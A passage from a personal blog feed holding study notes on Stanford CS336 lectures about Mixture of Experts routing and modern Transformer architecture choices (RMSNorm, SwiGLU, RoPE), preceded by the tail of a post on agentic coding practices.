performance.</li></ul><h3id="v.-pitfall-guide-the-correct-approach-to-configuration-files-e.g.-.cursorrules">V.Pitfall Guide: The Correct Approach to Configuration Files (e.g.,.cursorrules)</h3><ul><li><strong>Streamlined Configuration Files</strong>: Ideally, theyshould only contain content that is generally applicable to all tasks,avoiding instruction overload.</li><li><strong>On-demand Retrieval</strong>: Instead of cramming documentsinto prompts, provide a good document structure that allows the agent toactively call the “read file” tool when needed.</li></ul><hr /><h3id="conclusion-transitioning-from-problem-solving-to-educational-systems">Conclusion:Transitioning from “Problem Solving” to “Educational Systems”</h3><p>Agentic Coding is shifting from a “dialogue mode” to an “engineeringmode.” Through continuous practice, developers can become<strong>“expert generalists”</strong> in harnessing AI.</p><p>We should not view agents as an all-powerful black box but rather asinterns with top-notch comprehension that require a solid engineeringenvironment to thrive. The focus should be on <strong>optimizingcollaboration with AI</strong>, rather than hoping for infinite contextwindows. By <strong>deliberately practicing</strong> this skill, we canenable the system to gain memory and achieve sustained efficiencygrowth.</p><p><a href="https://mp.weixin.qq.com/s/Zlwn42KyfjgwfX6lp-JthQ">ByteDanceTechnology Team: Deconstructing Agentic Coding with FirstPrinciples</a></p>]]></content>
      
      
      <categories>
          
          <category> Technical Insights </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI Agent </tag>
            
            <tag> Technical Blog </tag>
            
            <tag> Code Agent </tag>
            
            <tag> Engineering Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec4 Mixture of Experts</title>
      <link href="/2025/12/17/CS336/CS336-Lec4-Mixture-of-Experts/"/>
      <url>/2025/12/17/CS336/CS336-Lec4-Mixture-of-Experts/</url>
      
        <content type="html"><![CDATA[<h1 id="cs336-lec4-mixture-of-experts">CS336-Lec4 Mixture ofExperts</h1><p>In the modern competition of ultra-large-scale LLMs, the Mixture ofExperts (MoE) model has become a core technology for achieving“trillions of parameters” and “controllable computational costs.”</p><h2 id="core-definition-of-moe">Core Definition of MoE</h2><p>Traditional Transformer models are dense, where every Token activatesall parameters. The basic idea of MoE is to replace the massive FFN withmultiple parallel expert networks, and then add a routing layer todetermine which expert(s) a Token will enter.</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218010555148.png" /></p><p>The output <span class="math inline">\(\mathbf{h}_t^l\)</span> of theMoE layer at position <span class="math inline">\(t\)</span> can berepresented as the weighted sum of the outputs from the selectedexperts: <span class="math display">\[\mathbf{h}_t^l = \sum_{i=1}^{N} \left( g_{i,t} \cdot \text{FFN}_i(\mathbf{u}_t^l) \right) + \mathbf{u}_t^l\]</span> where:</p><ul><li><span class="math inline">\(N\)</span> is the total number ofexperts.</li><li><span class="math inline">\(\mathbf{u}_t^l\)</span> is the inputToken vector for that layer.</li><li><span class="math inline">\(g_{i,t}\)</span> is the <strong>GatingWeight</strong> computed by the router, typically calculated via<strong>Top-K routing</strong>, as discussed in the next section.</li></ul><h2 id="routing-mechanism">Routing Mechanism</h2><p>The routing function is a very important part of MoE, as itdetermines the efficiency of parameter utilization. We will firstintroduce some possible implementations of routing mechanisms, which cangenerally be categorized into those that require Learning and those thatdo not:</p><ul><li>Learning-required mechanisms include Top-K and RL-basedrouting.</li><li>Non-learning mechanisms include Hash and Base Routing.</li></ul><p>Here, we will briefly introduce the two non-learning mechanisms:</p><ul><li><strong>Hash Routing:</strong> Uses a fixed hash function to assignTokens to experts. Since the routing is fixed, there is no need to<strong>learn</strong> the Router parameters, thus avoidingnon-differentiability issues.</li><li><strong>BASE Routing:</strong> Transforms the routing decision intoa <strong>Linear Assignment problem</strong> to find the optimal globalmatching.</li></ul><p>However, most models currently use Choose Top-K, which also hasseveral variants.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011033467.png" style="zoom:40%;" /></p><h3id="mathematical-details-of-top-k-routing-mainstream-approach">MathematicalDetails of Top-K Routing (Mainstream Approach)</h3><p>The router first calculates the relevance score <spanclass="math inline">\(s_{i,t}\)</span> between the Token and the expertembedding vector <span class="math inline">\(e_i\)</span>: <spanclass="math display">\[s_{i,t} = \text{Softmax}_i (\mathbf{u}_t^{lT} e_i^l)\]</span> Then, it implements sparse activation through the Top-Koperator: <span class="math display">\[g_{i,t} = \begin{cases} s_{i,t}, &amp; s_{i,t} \in \text{TopK}(\{s_{j,t}| 1 \le j \le N\}, K) \\ 0, &amp; \text{otherwise} \end{cases}\]</span><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011325691.png" alt="image-20251218011325691" style="zoom:60%;" /></p><h3 id="modern-architecture-variant-deepseekmoe">Modern ArchitectureVariant: DeepSeekMoE</h3><p>DeepSeek introduces more refined designs to enhance the effectivenessof MoE:</p><ul><li><strong>Fine-grained expert segmentation:</strong> Splits largeexperts into multiple smaller experts (e.g., <spanclass="math inline">\(2N\)</span>), allowing for more precise knowledgecombinations.</li><li><strong>Shared Expert Isolation:</strong> Sets fixed experts thathandle all Tokens sharing basic common knowledge, reducing redundancyamong routing experts.</li></ul><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011738375.png" /></p><h2 id="stability-of-training">Stability of Training</h2><p>The core challenge of MoE lies in how to train it stably. To improvetraining efficiency, the model needs to exhibit sparsity, but the sparsegating mechanism (Top-K) is <strong>Non-differentiable</strong>.Additionally, we need to maintain load balancing among experts; withoutconstraints on the Router, traffic can concentrate on certain experts,leading to others not being trained and becoming “dead experts.” We havethe following solutions to address this issue.</p><h3 id="reinforcement-learning">Reinforcement Learning</h3><p>The principle is straightforward: treat the entire Router as an agentand the Tokens as actions, using reinforcement learning algorithms tooptimize the routing strategy based on the final loss (as a reward).</p><p>However, this method is <strong>not commonly used</strong>; whilelogically correct, it suffers from <strong>high gradient variance andcomputational complexity</strong>, making it less favorable inlarge-scale training compared to other solutions.</p><h3 id="stochastic-perturbations">Stochastic Perturbations</h3><p>The principle is to add <strong>Gaussian noise</strong> or<strong>Jitter</strong> to the routing logits, forcing the model toexplore some unconventional paths. <span class="math display">\[H(x)_i = (x \cdot W_g)_i + \text{StandardNormal}() \cdot\text{Softplus}((x \cdot W_{noise})_i)\]</span> Even if the initial weights are poor, randomness allows eachexpert to have a chance to be trained, making the routing more robustand avoiding the emergence of dead experts.</p><h3 id="auxiliary-loss">Auxiliary Loss</h3><p>To ensure that each expert shares the task evenly, an auxiliary lossis introduced, meaning that experts used more frequently receive greaterpenalties, with the minimum loss ensuring that tasks are evenlydistributed among experts: <span class="math display">\[\text{Loss}_{aux} = \alpha \cdot N \cdot \sum_{i=1}^N f_i \cdot P_i\]</span> where:</p><ul><li><span class="math inline">\(f_i\)</span> (distribution ratio):Represents the proportion of Tokens assigned to expert <spanclass="math inline">\(i\)</span> in that batch.</li></ul><p><span class="math display">\[f_{i} = \frac{1}{T} \sum_{x \in \mathcal{B}} \mathbb{I}\{argmax \ p(x) =i\}\]</span></p><ul><li><span class="math inline">\(P_i\)</span> (routing probabilityratio): Represents the total probability assigned to expert <spanclass="math inline">\(i\)</span> by the Router.</li></ul><p><span class="math display">\[P_{i} = \frac{1}{T} \sum_{x \in \mathcal{B}} p_{i}(x)\]</span></p><h3 id="implementation-of-deepseek-variants">Implementation of DeepSeekVariants</h3><p><strong>DeepSeek v1-2 (Dual Balance of Experts and Devices):</strong>Introduces <code>Per-expert</code> Loss (consistent with SwitchTransformer) to ensure balance among experts, and<code>Per-device</code> Loss to ensure balance in cross-GPUcommunication (All-to-All).</p><p><strong>DeepSeek v3 (No Auxiliary Loss Balance):</strong> Introducesthe Per-expert Bias (<span class="math inline">\(b_i\)</span>)mechanism: <span class="math display">\[S_{i,t}^{\prime} = \begin{cases} s_{i,t}, &amp; s_{i,t}+b_{i} \inTopk(\{s_{j,t}+b_{j} | 1 \le j \le N_{r}\}, K_{r}) \\ 0, &amp;\text{otherwise} \end{cases}\]</span> Adjusts the bias <span class="math inline">\(b_i\)</span>through online learning to achieve balance without disrupting thegradient of the main loss (Auxiliary-loss-free).</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020026696.png" alt="image-20251218020026696" style="zoom: 33%;" /></p><h2id="system-optimization-distributed-parallelism-and-computational-optimization">SystemOptimization: Distributed Parallelism and ComputationalOptimization</h2><p>Due to the enormous parameter scale, the physical implementation ofMoE heavily relies on parallelization.</p><h3 id="device-placement">1. Device Placement</h3><ul><li><strong>All-to-All Dispatch:</strong> Tokens are distributed acrossdevices to the corresponding expert nodes based on routing results.</li><li><strong>All-to-All Combine:</strong> Computation results arereturned while maintaining sequence order.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020429348.png" alt="image-20251218020429348" style="zoom:70%;" /></p><h3 id="computational-operator-optimization-megablocks">2. ComputationalOperator Optimization (MegaBlocks)</h3><p>Traditional matrix multiplication is inefficient when facing unevenloads. Libraries like MegaBlocks introduce <strong>Block SparseMM</strong>, which can efficiently handle variable-length expertcomputations, avoiding resource waste due to padding.</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020552365.png" /></p><h2 id="advanced-techniques">Advanced Techniques</h2><p><strong>z-loss (Numerical Smoothing):</strong> To prevent Softmaxfrom overflowing at low precision, it penalizes <spanclass="math inline">\(\log^2 Z\)</span> (where <spanclass="math inline">\(Z\)</span> is the partition function) to forcelogits to remain within a safe range.</p><p><strong>Upcycling:</strong> Trained dense model FFN weights can becloned multiple times as initial values for MoE experts, significantlyshortening the training time from scratch, showing substantialimprovements on some models.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023241811.png" alt="image-20251218023241811" style="zoom:50%;" /></p><p><strong>MTP (Multi-Token Prediction):</strong> A technique used inDeepSeek v3. It adds a lightweight module outside the main model topredict multiple future Tokens at once, enhancing the model’s ability tomodel long texts.</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023351698.png" /></p><p><strong>MLA (Multi-Head Latent Attention):</strong> A key solution inDeepSeek v3 to the KV Cache bottleneck. It compresses Q, K, and V into alow-dimensional “latent” space, requiring only a small latent vector<span class="math inline">\(c_t^{KV}\)</span> to be cached duringinference, significantly reducing memory usage. Additionally, through adecoupled design, some dimensions do not participate in compression (a<strong>hard rule set during model architecture</strong>) to accommodaterotary position encoding (RoPE), resolving conflicts between positionencoding and compressed cache.</p><ol type="1"><li><strong>Why is caching avoided?</strong> A: The reconstructionmatrix <span class="math inline">\(W^{UK}\)</span> can be directly<strong>absorbed into the projection of the query matrix Q. This meansthat during inference, we </strong>only need to cache thelow-dimensional <span class="math inline">\(c_t^{KV}\)</span>** inmemory, rather than caching the reconstructed multi-head K and V.</li></ol><p><span class="math display">\[\text{Score} = (h W_Q)^T \times (W_{UK} c_t^{KV}) = h \cdot (W_Q W_{UK})\cdot c_t^{KV}\]</span></p><ol start="2" type="1"><li><strong>Why should RoPE be decoupled? Can’t we just add RoPEdirectly in the latent space?</strong> A: No, looking directly at theformula, we cannot merge the matrices into one, which would require usto restore the Key, thus ruining the plan to save memory.</li></ol><p><span class="math display">\[\text{Score} = (R_m h W_Q)^T \times (R_n W_{UK} c_n^{KV}) = h W_Q \cdot(R_m^T R_n) \cdot W_{UK} c_n^{KV}\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023318356.png" alt="image-20251218023318356" style="zoom:30%;" /></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Transformer </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> Mixture of Experts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec3 Architectures &amp; Hyperparameters</title>
      <link href="/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/"/>
      <url>/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/</url>
      
        <content type="html"><![CDATA[<h1 id="cs336-lec3-architectures-hyperparameters">CS336-Lec3Architectures &amp; Hyperparameters</h1><h2 id="overview-of-original-vs.-modern-transformer">Overview ofOriginal vs. Modern Transformer</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216141431763.png" style="zoom:33%;" /></p><table><colgroup><col style="width: 11%" /><col style="width: 29%" /><col style="width: 29%" /><col style="width: 29%" /></colgroup><thead><tr class="header"><th><strong>Feature</strong></th><th><strong>Original Transformer</strong></th><th><strong>Modern Variants</strong></th><th><strong>Optimization Goals/Advantages</strong></th></tr></thead><tbody><tr class="odd"><td><strong>Layer Normalization</strong></td><td><strong>Post-Norm</strong>: After each sub-layer(Attention/FFN).</td><td><strong>Pre-Norm</strong>: Before each sub-layer.</td><td>Improves <strong>training stability</strong> of deep models andaccelerates convergence.</td></tr><tr class="even"><td><strong>Normalization Type</strong></td><td>LayerNorm: Normalizes mean and variance</td><td><strong>RMSNorm</strong>: Normalizes only variance, does notsubtract mean, no bias term.</td><td>Faster computation, fewer parameters, no significant drop inperformance.</td></tr><tr class="odd"><td><strong>Bias Term</strong></td><td>FFN and linear layers <strong>have</strong> bias term <spanclass="math inline">\(\boldsymbol{b}\)</span>.</td><td>Linear layers (including normalization layers) <strong>do nothave</strong> bias term.</td><td>Reduces memory usage and improves optimization stability.</td></tr><tr class="even"><td><strong>Positional Encoding</strong></td><td><strong>Sine/Cosine Encoding</strong>: Adds positional informationto embeddings.</td><td><strong>Rotary Positional Encoding (RoPE)</strong>: Encodespositional information into the <strong>rotation</strong> operation ofquery and key (Q/K) vectors.</td><td>Better captures <strong>relative positional information</strong>,has become standard for most SOTA models (like LLaMA) after 2024.</td></tr><tr class="odd"><td><strong>FFN Activation Function</strong></td><td><strong>ReLU</strong></td><td><strong>SwiGLU/GeGLU</strong>: A <strong>gated activationfunction</strong>.</td><td>Generally outperforms ReLU and GeLU, with more consistentgains.</td></tr><tr class="even"><td><strong>Layer Connection</strong></td><td><strong>Serial</strong>: Computes Attention first, then computesMLP.</td><td><strong>Serial or Parallel</strong>: Attention and MLP compute inparallel.</td><td><strong>Parallel</strong> structure can achieve about <strong>15%training speedup</strong> through matrix multiplication fusion duringlarge-scale training.</td></tr></tbody></table><h2 id="normalization">Normalization</h2><p>In the Transformer architecture, the position of normalization layersis crucial for the stability and efficiency of model training. ModernLLMs have almost uniformly discarded the original normalizationpositions in favor of more stable strategies.</p><h3 id="pre-norm-vs.-post-norm">Pre-Norm vs. Post-Norm</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216142424625.png" alt="image-20251216142424625" style="zoom:40%;" /></p><ul><li><strong>Post-Norm (Original Transformer):</strong> Normalizationoccurs after the residual connection of each sub-layer (like Multi-HeadAttention or FFN). This structure can lead to <strong>gradientvanishing</strong> or <strong>gradient explosion</strong> when trainingdeep models, affecting training stability.</li><li><strong>Pre-Norm (Modern LLM):</strong> Normalization occurs<strong>before</strong> each sub-layer. This placement ensures that themain path signal of the residual connection maintains a good scale,greatly improving <strong>gradient propagation</strong> and enhancingtraining stability in deep networks.</li></ul><p>It is worth noting that <strong>almost all modern LMs use pre-norm(but BERT was post-norm)</strong>.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216142618552.png" alt="image-20251216142618552" style="zoom:30%;" /></p><h3 id="layernorm-vs.-rmsnorm">LayerNorm vs. RMSNorm</h3><p>The original Transformer uses LayerNorm, while modern LLMs tend toprefer RMSNorm. There are core differences in mathematical andengineering efficiency between these two methods.</p><p><strong>LayerNorm</strong>: <span class="math display">\[y=\frac{\boldsymbol{x}-E[\boldsymbol{x}]}{\sqrt{\text{Var}[\boldsymbol{x}]+\epsilon}}\cdot \gamma+\beta\]</span></p><ul><li>The above is to <strong>center</strong> and<strong>normalize</strong> the input <spanclass="math inline">\(\boldsymbol{x}\)</span> (e.g., a <spanclass="math inline">\(d_{model}\)</span> dimensional feature vector of atoken) of a layer in the neural network, making its mean 0 and variance1.</li><li><span class="math inline">\(\gamma\)</span> and <spanclass="math inline">\(\beta\)</span> are the <strong>scalingparameter</strong> and <strong>offset parameter</strong>, respectively,which are <strong>learnable</strong> to <strong>restore the model’sexpressiveness</strong>.</li></ul><p><strong>RMSNorm</strong>: <span class="math display">\[y=\frac{\boldsymbol{x}}{\sqrt{\frac{1}{D}\sum_{i=1}^{D}\boldsymbol{x}_i^2+\epsilon}}\cdot \gamma\]</span></p><ul><li>The root mean square RMS <spanclass="math inline">\(\sqrt{\frac{1}{D}\sum_{i=1}^{D}\boldsymbol{x}_i^2+\epsilon}\)</span>:the <strong>square root</strong> of the mean square plus a small value,used as the normalization factor. It approximates the <spanclass="math inline">\(\ell_2\)</span> norm of the vector.</li><li><span class="math inline">\(\gamma\)</span> retains only the scalingparameter, removing the offset parameter.</li></ul><p>Core difference: RMSNorm simplifies LayerNorm: it abandons thecomputation and subtraction of the mean (centering) operation, retainingonly the <strong>scale normalization</strong>. This has been proveneffective in practice.</p><p><strong>Analysis of Engineering Efficiency and TrainingAdvantages</strong></p><p>RMSNorm is widely adopted in modern LLMs mainly due to a trade-offbetween engineering efficiency and practical effectiveness:</p><ul><li><strong>Faster runtime</strong> (wallclock time)<ul><li><strong>Computational advantage</strong>: RMSNorm <strong>does notcompute the mean</strong>, resulting in fewer operations thanLayerNorm.</li><li><strong>Parameter advantage</strong>: RMSNorm <strong>does not havea bias term</strong> <span class="math inline">\(\beta\)</span>,requiring fewer parameters to store.</li><li><strong>Data movement</strong>: Although the FLOPs of normalizationoperations are small (about 0.17%), their runtime proportion is high(about 25.5%). Reducing parameters and computations can decrease datamovement, thus saving actual training time.</li></ul></li><li><strong>Comparable performance</strong>: Practical evidence showsthat <strong>RMSNorm</strong> is generally <strong>as effective asLayerNorm</strong>, and tabular data even indicates that RMSNorm showsslight improvements over Vanilla Transformer in Early Loss and FinalLoss.</li></ul><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216152549044.png" /></p><div class="note info flat"><p>In fact, modern FFN structures have even dropped the bias term: <spanclass="math display">\[\underbrace{\text{FFN}(\boldsymbol{x}) = \max(0, \boldsymbol{x}\boldsymbol{W}_1 + \boldsymbol{b}_1) \boldsymbol{W}_2 +\boldsymbol{b}_2}_{\text{Original Transformer (ReLU, with bias term)}}\quad \longrightarrow \quad \underbrace{\text{FFN}(\boldsymbol{x}) =\sigma(\boldsymbol{x} \boldsymbol{W}_1) \boldsymbol{W}_2}_{\text{ModernSimplification (}\sigma\text{, without bias term)}}\]</span></p></div><h2 id="activation-functions">Activation Functions</h2><p>Activation functions are the core mechanism for introducing<strong>non-linearity</strong> in neural networks. In the Transformerarchitecture, the choice of activation function in FFN has evolved fromReLU to more complex gated mechanisms.</p><h3 id="relu-rectified-linear-unit">ReLU (Rectified Linear Unit)</h3><p><span class="math display">\[\text{FFN}(\boldsymbol{x}) = \max(0, \boldsymbol{x} \boldsymbol{W}_1)\boldsymbol{W}_2\]</span></p><p>Low computational cost; outputs 0 when <span class="math inline">\(x\le 0\)</span>.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216161501051.png" alt="image-20251216161501051" style="zoom:80%;" /></p><h3 id="gelu-gaussian-error-linear-unit">GeLU (Gaussian Error LinearUnit)</h3><p>GeLU is a smooth activation function that introduces statisticalconcepts based on ReLU. <span class="math display">\[\text{FFN}(\boldsymbol{x}) = \text{GeLU}(\boldsymbol{x}\boldsymbol{W}_1) \boldsymbol{W}_2\]</span></p><p><span class="math display">\[\text{GeLU}(\boldsymbol{x}) = \boldsymbol{x} \cdot \Phi(\boldsymbol{x})\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216161522871.png" style="zoom:80%;" /></p><p>Core concept: <spanclass="math inline">\(\Phi(\boldsymbol{x})\)</span> is the cumulativedistribution function (CDF).</p><p><span class="math inline">\(\Phi(\boldsymbol{x})\)</span>specifically refers to the CDF of the <strong>standard normaldistribution</strong>.</p><ul><li><strong>Definition of CDF:</strong> For a random variable <spanclass="math inline">\(X\)</span>, its CDF <spanclass="math inline">\(\boldsymbol{F}(\boldsymbol{x})\)</span> is definedas <span class="math inline">\(P(X \le \boldsymbol{x})\)</span>, whichis the probability that the random variable takes a value <strong>lessthan or equal to</strong> <spanclass="math inline">\(\boldsymbol{x}\)</span>. The range of CDF isalways between <span class="math inline">\([0, 1]\)</span>.</li><li><strong>Role of <spanclass="math inline">\(\Phi(\boldsymbol{x})\)</span>:</strong> In GeLU,<span class="math inline">\(\Phi(\boldsymbol{x})\)</span> acts as a<strong>smooth “gate”</strong> or <strong>weight factor</strong>:<ul><li>When <span class="math inline">\(\boldsymbol{x}\)</span> is a largepositive number, <span class="math inline">\(\Phi(\boldsymbol{x})\approx 1\)</span> (the signal is fully retained).</li><li>When <span class="math inline">\(\boldsymbol{x}\)</span> isnegative, <span class="math inline">\(\Phi(\boldsymbol{x})\)</span>gradually approaches <span class="math inline">\(0\)</span> (the signalis smoothly suppressed).</li></ul></li><li><strong>Graphical advantage:</strong> This multiplication operationbased on CDF eliminates the non-differentiable sharp point of ReLU at<span class="math inline">\(\boldsymbol{x}=0\)</span>, making GeLU<strong>smooth everywhere</strong>, thus improving training stability indeep networks.</li></ul><h3 id="glu-gated-linear-unit">GLU (Gated Linear Unit)</h3><p>The GLU family introduces a more complex gating mechanism and isconsidered one of the most powerful FFN activation mechanismscurrently.</p><p>GLU is the foundation of all gated activations; it not only performsa simple non-linear transformation on the input but also uses twoindependent <strong>linear projections</strong> to control the flow ofinformation.</p><ul><li><strong>Core structure:</strong> Compared to <spanclass="math inline">\(\text{FF}(\boldsymbol{x}) = \max(0,\boldsymbol{x}\boldsymbol{W}_1)\boldsymbol{W}_2\)</span>: GLU introducesan additional parameter matrix <spanclass="math inline">\(\boldsymbol{V}\)</span>. It replaces <spanclass="math inline">\(\max(0, \boldsymbol{x}\boldsymbol{W}_1)\)</span>with <span class="math inline">\(\max(0, \boldsymbol{x}\boldsymbol{W}_1)\otimes (\boldsymbol{x}\boldsymbol{V})\)</span> (ReGLU).</li><li><strong>Gating mechanism:</strong> (<spanclass="math inline">\(\boldsymbol{x}\boldsymbol{V}\)</span>) serves asthe <strong>gating signal</strong>, controlling the amount ofinformation flow through the activation function via<strong>element-wise multiplication</strong> (<spanclass="math inline">\(\otimes\)</span>).</li><li><strong>Advantage:</strong> Enhances the model’s non-linearexpressiveness, proven to yield consistent performance gains.</li></ul><h3 id="geglu-gated-gelu">GeGLU (Gated GeLU)</h3><ul><li><p><strong>Formula</strong>: <spanclass="math inline">\(\text{FFN}_{\text{GeGLU}}(\boldsymbol{x},\boldsymbol{W}, \boldsymbol{V}, \boldsymbol{W}_2) =(\text{GeLU}(\boldsymbol{x} \boldsymbol{W}) \otimes \boldsymbol{x}\boldsymbol{V}) \boldsymbol{W}_2\)</span></p></li><li><p><strong>Characteristics</strong>: Combines the smoothness of GeLUwith the gating mechanism.</p></li></ul><h3 id="swiglu-gated-swish">SwiGLU (Gated Swish)</h3><ul><li><strong>Formula</strong>: <spanclass="math inline">\(\text{FFN}_{\text{SwiGLU}}(\boldsymbol{x},\boldsymbol{W}, \boldsymbol{V}, \boldsymbol{W}_2) =(\text{Swish}_1(\boldsymbol{x} \boldsymbol{W}) \otimes \boldsymbol{x}\boldsymbol{V}) \boldsymbol{W}_2\)</span>, where <spanclass="math inline">\(\text{Swish}(\boldsymbol{x}) = \boldsymbol{x}\cdot \text{sigmoid}(\boldsymbol{x})\)</span>.</li><li><strong>Status</strong>: Currently one of the <strong>most popularand powerful</strong> activation functions.</li></ul><p>Swish function: <span class="math display">\[\text{Swish}(\boldsymbol{x}) = \boldsymbol{x} \cdot\text{sigmoid}(\boldsymbol{x})\]</span> where <spanclass="math inline">\(\text{sigmoid}(\boldsymbol{x}) = \frac{1}{1 +e^{-\boldsymbol{x}}}\)</span>.</p><p>The characteristics of the Swish activation function often make itsuperior to ReLU in practice:</p><ul><li><strong>Smoothness:</strong> Swish is a <strong>smooth function thatis differentiable everywhere</strong>. This is similar to GeLU, avoidingthe sharp corner of ReLU at <span class="math inline">\(x=0\)</span>,which helps stabilize the optimization process.</li><li><strong>Non-monotonicity:</strong> Swish exhibits<strong>non-monotonicity</strong> on the negative half-axis (i.e., itscurve decreases in the region where <span class="math inline">\(x &lt;0\)</span>, reaches a minimum, and then gradually approaches zero),allowing the model to retain or assign some <strong>weight to negativeinformation</strong>, enhancing the model’s expressiveness.</li></ul><h3 id="summary">Summary</h3><p>The preferred activation functions for modern LLMs are<strong>SwiGLU</strong> or <strong>GeGLU</strong>, which introducegating structures, simplify implementations by removing bias terms, andprovide consistent performance gains, thereby enhancing the model’sexpressiveness. However, it is still important to note that<strong>GLU</strong> is not the only necessary condition for buildingexcellent models (e.g., GPT-3 still uses GeLU).</p><h2 id="serial-vs.-parallel">Serial vs. Parallel</h2><p>The traditional <strong>serial computation</strong> method computesAttention and its residual connections first, then uses the Attentionresults as input for FFN, followed by computing FFN and its residualconnections. In this case, Attention and FFN must wait for the previouscomputation to complete sequentially.</p><p>To improve training efficiency, some modern models, represented byGPT-J, PaLM, and GPT-NeoX, have introduced a <strong>parallelstructure</strong>. The core idea is: <strong>Attention and FFN sharethe same input and compute simultaneously</strong>.</p><ul><li><strong>Input Sharing</strong>: Both the Attention Block and MLPBlock receive the <strong>original input <spanclass="math inline">\(\boldsymbol{x}\)</span> after LayerNorm</strong>as their input signal.</li><li><strong>Parallel Computation</strong>: The two sub-layers computetheir results independently and simultaneously.</li><li><strong>Residual Merging</strong>: The outputs of the two sub-layers(Attention gain and MLP gain) are combined back to the original input<span class="math inline">\(\boldsymbol{x}\)</span> through a<strong>single residual connection</strong>, forming the final output<span class="math inline">\(\boldsymbol{y}\)</span>.</li></ul><p><span class="math display">\[\boldsymbol{y} = \boldsymbol{x} +\text{MLP}(\text{LayerNorm}(\boldsymbol{x})) +\text{Attention}(\text{LayerNorm}(\boldsymbol{x}))\]</span></p><p>The parallel structure is adopted mainly due to significant<strong>training acceleration</strong>:</p><ul><li><strong>Speed Improvement</strong>: The parallel structure canachieve about <strong>15% training speedup</strong> during large-scaletraining.</li><li><strong>Matrix Fusion</strong>: This acceleration primarily benefitsfrom <strong>matrix multiplication fusion</strong>. Since the inputmatrix multiplications of Attention and MLP can be merged, it reducesmemory access and computational overhead.</li><li><strong>Performance Assurance</strong>: Experiments have shown thatif implemented properly, parallelization has minimal degradation onmodel quality, even negligible.</li></ul><h2 id="embedding">Embedding</h2><p>Due to the permutation-invariant nature of the Transformer’sSelf-Attention mechanism, we must explicitly inject positionalinformation. The evolution of positional encoding in modern LLMs mainlyrevolves around “how to better capture relative positions.”</p><h3 id="sine-embeddings">Sine Embeddings</h3><p><span class="math display">\[Embed(x, i) = v_x + PE_{pos} \\PE_{(pos, 2i)} = \sin(pos/10000^{2i/d_{\text{model}}}) \\PE_{(pos, 2i+1)} = \cos(pos/10000^{2i/d_{\text{model}}})\]</span></p><p>Although it possesses the mathematical properties of relativepositions, the expanded terms in the Attention computation <spanclass="math inline">\(\langle v_x + p_i, v_y + p_j \rangle\)</span> willinclude messy <strong>cross-terms</strong>, such as <spanclass="math inline">\(\langle v_x, PE_j \rangle\)</span>. These termsmix content and positional information and are considered noise.</p><h3 id="absolute-embeddings">Absolute Embeddings</h3><p><span class="math display">\[Embed(x, i) = v_x + u_i\]</span></p><p>Directly learns a trainable vector for each position <spanclass="math inline">\(i\)</span>.</p><p><strong>Limitations</strong>: Clearly not relative (obviously notrelative), and has poor extrapolation capabilities, making it difficultto handle sequences longer than the training length.</p><h3 id="relative-embeddings">Relative Embeddings</h3><p>Directly adds a bias term <span class="math inline">\(a_{ij}\)</span>in the Attention computation. The formula is <spanclass="math display">\[e_{ij} = \frac{x_i W^Q (x_j W^K + a_{ij}^K)^T}{\sqrt{d_z}}\]</span> Although it solves the relative position problem, it is nolonger in the standard inner product form (not an inner product),increasing the complexity of computational implementation.</p><h3 id="rope-rotary-position-embeddings">RoPE: Rotary PositionEmbeddings</h3><p>RoPE is the standard configuration for current SOTA models (likeLLaMA, PaLM, GPT-J). Its design aims to meet a core mathematical goal:<strong>High level thought process</strong>: to find a coding function<span class="math inline">\(f(x, i)\)</span> such that the inner productof two vectors depends only on their relative distance <spanclass="math inline">\(i-j\)</span>. That is: <spanclass="math display">\[\langle f(x, i), f(y, j) \rangle = g(x, y, i - j)\]</span> RoPE utilizes the property of vector inner products beinginvariant to rotation.</p><ul><li><strong>Mechanism</strong>: RoPE does not perform at the Input Layerbut rather applies <strong>rotation operations</strong> on <spanclass="math inline">\(Q\)</span> and <spanclass="math inline">\(K\)</span> at the Attention layer.</li><li><strong>Method</strong>: It splits vectors into pairs in atwo-dimensional plane. For position <spanclass="math inline">\(m\)</span>, it rotates the vector by an angle of<span class="math inline">\(m\theta\)</span> in the plane. Regardless ofthe absolute position, as long as the relative distance between twotokens is fixed, their rotated relative angle remains fixed, thusperfectly capturing relative positional information through the innerproduct.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194036939.png"alt="image-20251216194036939" /><figcaption aria-hidden="true">image-20251216194036939</figcaption></figure><h2 id="hyperparameters-dimensions">Hyperparameters &amp;Dimensions</h2><h3 id="attention-dimensions-the-1-1-ratio">Attention Dimensions: The“1-1 Ratio”</h3><p>In standard Transformer design, it is common to maintain<strong>Head_Dim <span class="math inline">\(\times\)</span> Head_Num =Model_Dim</strong> (i.e., <span class="math inline">\(d_p \cdot h =d_{model}\)</span>).</p><p><strong>Low-Rank Bottleneck 